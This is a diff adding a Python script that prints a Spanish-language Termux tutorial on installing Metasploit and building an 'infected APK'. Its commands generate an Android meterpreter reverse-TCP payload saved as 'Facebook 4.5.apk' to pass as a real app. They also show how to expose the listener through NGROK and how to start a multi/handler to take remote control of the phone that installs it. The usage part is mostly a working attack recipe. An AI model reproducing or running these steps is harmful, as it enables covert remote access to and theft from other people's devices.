@@ -1,0 +1,62 @@
+print("""
+\033[1;31m¿Qué es Metasploit??
+
+\033[1;39mMetasploit es un proyecto de código abierto para la seguridad informática, que proporciona información acerca de vulnerabilidades de seguridad y ayuda en tests de penetración "Pentesting" y el desarrollo de firmas para sistemas de detección de intrusos.
+
+\033[1;33mNSTALACIÓN DE metasploit-framework EN TERMUX (ANDROID 7.0.1 EN ADELANTE))
+
+\033[1;36mapt update && apt upgrade -y
+ 
+pkg install unstable-repo
+	  
+pkg install metasploit
+
+\033[1;33mINSTALACIÓN DE metasploit-framework EN TERMUX (ANDROID 5.0.1 Y ANDROID 6.0.1
+
+\033[1;39mapt update && apt upgrade -y
+	 
+pkg install -y curl
+
+curl -LO https://github.com/termux/termux-packages/files/3995119/metasploit_5.0.65-1_all.deb.gz
+
+gunzip metasploit_5.0.65-1_all.deb.gz
+dpkg -i metasploit_5.0.65-1_all.deb
+
+apt install -f -y
+
+\033[1;32mUso:
+
+\033[1;33mPara crear un APK infectado usaremos el siguiente comando:
+
+\033[1;39mmsfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=3333 R > /sdcard/Facebook 4.5.apk
+
+\033[1;36mLHOST=\033[1;39mAqui colocaremos nuestro servidor en mi caso puse mi servidor local, para usar metasploit fuera de la red necesitamos \033[1;33mNGROK
+\033[1;36mLPORT=\033[1;39mAqui pondremos nuestro puerto en mi caso 3333
+\033[1;36mR > = \033[1;39mAqui colocamos la ruta y el nombre de nuestro APK
+
+\033[1;32mAbriremos metasploit con:
+
+\033[1;39mmsfconsole
+
+\033[1;33mUna ves abierto los comandos a usar son:
+
+\033[1;39muse exploit/multi/handler
+
+set payload android/meterpreter/reverse_tcp
+
+\033[1;33mUna ves obtenido el meterpreter:
+
+\033[1;39mset lhost 127.0.0.0 \033[1;34mAqui va el host que usamos para crear el apk
+\033[1;39mset lport 3333\033[1;34mAqui va el puerto que usamos para crear el apk
+
+\033[1;33mFinalmente usaremos:
+
+\033[1;39mrun \033[1;34mPara arrancar.
+
+
+\033[1;33mGuia detallada: https://www.sniferl4bs.com/2018/09/hacking-con-ngrok-set-seeker-y.html?m=1"
+
+
+""")
+
+
